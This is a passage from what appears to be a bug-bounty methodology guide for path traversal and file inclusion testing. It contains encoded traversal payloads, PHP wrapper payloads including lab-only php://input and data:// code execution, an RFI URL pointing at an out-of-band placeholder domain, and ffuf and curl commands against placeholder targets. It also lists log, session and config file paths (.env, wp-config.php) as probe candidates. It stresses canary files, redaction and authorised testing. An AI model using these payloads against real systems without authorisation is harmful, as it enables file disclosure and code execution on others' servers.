/proc/self/cwd/<APP_FILE>          /proc/self/root<ABSOLUTE_CANARY>

## [Bugbountyskills.md] Archive/pack wrappers (read-only; need an upload first → V-10/V-11)

zip://<UPLOADED_ARCHIVE>#<ENTRY_NAME>
phar://<UPLOADED_ARCHIVE>/<INNER_PATH>      # note: phar metadata also hits unserialize

## [Bugbountyskills.md] LAB ONLY — execution escalation (never against production):

POST /<SINK>?file=php://input          body: <?php echo 'LAB-OK'; ?>    # allow_url_include=On
GET  /<SINK>?file=data://text/plain;base64,PD9waHAgZWNobyAnTEFCT0snOyA/Pg=
```

Cross-check rule: if the base64 decodes to garbage or to *your input*, the app
is not reading the file — that is a false positive, not a finding.

## [Bugbountyskills.md] 3. Filter-bypass ladder

Climb rung by rung; record block / no-effect / content per rung. Stop rule:
if two consecutive rungs change nothing **and** the oracle stays flat, the
filter holds — document that and pivot to another parameter instead of
spraying encodings.

**Rung 0 — baseline + oracle:** benign value, then existing-vs-missing file
comparison. Everything below is a differential against this.

**Rung 1 — dot-segment stripping** (single-pass `str_replace('../','')` and
siblings; the filter does half your work for you):

```
....//....//....//<CANARY>       ..././..././<CANARY>
..//..//<CANARY>                 ....\/....\/<CANARY>
..%2f..%2f<CANARY>               (encoding here is still rung 1 if strip is the filter)
```

**Rung 2 — filter recursion / encoding interaction** (strip runs at one
encoding level; sink decodes at another):

```
%2e%2e%2f%2e%2e%2f<CANARY>       # filter matches literal "../" only
..%2f..%2f<CANARY>               # filter matches "%2e" only
%252e%252e%252f<CANARY>          # strip after decode 1, sink decodes twice (V-06)
..%252f<CANARY>                  # mixed level — often missed by both rules
%2e%2e/%2e%2e/<CANARY>           # half-encoded: defeats exact-match regexes
```

**Rung 3 — case / encoding / whitespace / separator** (literal-match filters):

```
%2E%2E%2F<CANARY>   %2e../<CANARY>   .%2e/<CANARY>   ..%2F<CANARY>
..%09/<CANARY>   ..%0a/<CANARY>   ..%0d/<CANARY>   ..%20/<CANARY>
..%5c..%5c<CANARY>            # backslash — Windows targets (V-12 matrix)
..;/..;/<CANARY>              # servlet path-param stripping
<c0 af> overlong / fullwidth slash / %u002e    # legacy one-probes (expect fail)
```

**Rung 4 — wrapper / alternate vector** (path filters are airtight — change
the *kind* of input, not its encoding):

```
php://filter/convert.base64-encode/resource=<CANARY>   # read proof (§2)
data://text/plain,PROBE-<TOKEN>                        # wrapper support
zip://<UPLOAD>#<ENTRY>  ·  phar://<UPLOAD>/<PATH>      # via upload (V-10/V-11)
<ABSOLUTE_CANARY_PATH>                                # prefix-override sink
http://<PLACEHOLDER_OOB_DOMAIN>/rfi-001.txt           # URL param → V-02
<SESSION_DIR>/sess_<YOUR_ID>  ·  <LOG_PATH>           # V-13 / V-08 targets
```

## [Bugbountyskills.md] 4. Safe canary files per OS

| OS / context | Canary | "Good" response | Notes |
|---|---|---|---|
| Linux (first choice) | `/etc/hostname` | Short host-unique string | Non-secret, OS-unique, perfect first system read |
| Linux (alternates) | `/etc/issue`, `/etc/os-release`, `/proc/version` | Banner / distro ID / kernel string | `/proc/version` also fingerprints containers |
| Linux (proc anchors) | `/proc/self/cwd`, `/proc/self/cgroup` | App cwd path / container ID | Proves resolve-through-proc when abs paths are stripped |
| Windows | `C:\Windows\win.ini` | Keep **only** the `[fonts]` header line | Classic signature; minimal-excerpt rule applies |
| Windows (alt) | `C:\Windows\System32\drivers\etc\hosts` | Generic hosts file header | Use when `win.ini` is blocked |
| macOS | `/System/Library/CoreServices/SystemVersion.plist` | ProductVersion block | Rare target; harmless |
| App-owned / entitled | Your account export, planted upload, `/robots.txt` | Known content you already hold | **Start here** — zero bystander impact |
| Fixture check | Invented name: `/etc/notafile-<TOKEN>` | Distinct ENOENT / different error | Proves content came from the FS, not a bundled copy |

Evidence discipline: canary first → system file = one redacted signature line →
config = key names only, values redacted. `/etc/shadow`, keys, credentials,
other users' data: do not request.

## [Bugbountyskills.md] --- ffuf: depth sweep (../ x N) against a path param ---

ffuf -u 'https://<TARGET>/view?file=FUZZ<PLACEHOLDER_CANARY_PATH>' \
     -w '<PLACEHOLDER_WORDLIST:dot-depths.txt>' \
     -mr '<PLACEHOLDER_CANARY_STRING>' -t 10

## [Bugbountyskills.md] --- ffuf: wrapper fuzzing (rung 4) ---

ffuf -u 'https://<TARGET>/download?file=FUZZ' \
     -w '<PLACEHOLDER_WORDLIST:php-wrappers.txt>' \
     -mr '<PLACEHOLDER_CANARY_STRING>' -t 10

## [Bugbountyskills.md] traversal-encodings.txt  →  ../  ....//  %2e%2e%2f  %252e%252e%252f  ..%5c  ..;/

## [Bugbountyskills.md] dot-depths.txt           →  ../  ../../  ../../../  …  ../../../../../../../../

## [Bugbountyskills.md] php-wrappers.txt         →  php://filter/convert.base64-encode/resource=

## [Bugbountyskills.md] data://text/plain,  zip://  phar://  file://

## [Bugbountyskills.md] --- curl: wrapper proof with round-trip check ---

curl -s 'https://<TARGET>/download?file=php://filter/convert.base64-encode/resource=<PLACEHOLDER_CANARY_PATH>' \
  | tr -d '\n' | base64 -d 2>/dev/null | head -c 200

## [Bugbountyskills.md] --- payload encoding without shell mangling ---

python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" '<RAW_PAYLOAD>'

## [Bugbountyskills.md] --- Burp workflow: Decoder for stacked decodes, Repeater match/extract for the

## [Bugbountyskills.md] canary marker, Intruder with payload positions on the path param; compare

## [Bugbountyskills.md] block-page signatures (V-12) between plain and encoded variants. ---

```

## [Bugbountyskills.md] 6. Path catalogue (probe candidates)

- **Canaries:** `/etc/hostname`, `/etc/issue`, `/proc/version`, `/etc/os-release`,
  `C:\Windows\win.ini` (signature line only)
- **Logs (V-08):** `/var/log/apache2/access.log`, `/var/log/apache/access.log`,
  `/var/log/httpd/access_log`, `/var/log/nginx/access.log`,
  `/var/log/auth.log`, `/var/log/mail.log`, rotated `access.log.1` /
  `access.log.2.gz` (needs inflate filter), Windows
  `C:\xampp\apache\logs\access.log`, `C:\xampp\nginx\logs\access.log`,
  app logs `<APP_ROOT>/logs/<APP>.log`
- **Sessions (V-13):** `/var/lib/php/sessions/sess_<ID>` (+ `/0/`…`/6/` shard
  subdirs), `/var/lib/php5/sess_<ID>`, `/tmp/sess_<ID>`,
  `/var/lib/php/session/sess_<ID>`, `C:\xampp\php\tmp\sess_<ID>`
- **Root config (V-15 / discovery belongs to `info-disclosure-testing`):**
  `.env`, `.env.local`, `.git/HEAD`, `config.php`, `wp-config.php(.bak)`,
  `settings.py`, `application.yml`, `appsettings.json` — read for *structure*,
  redact all values

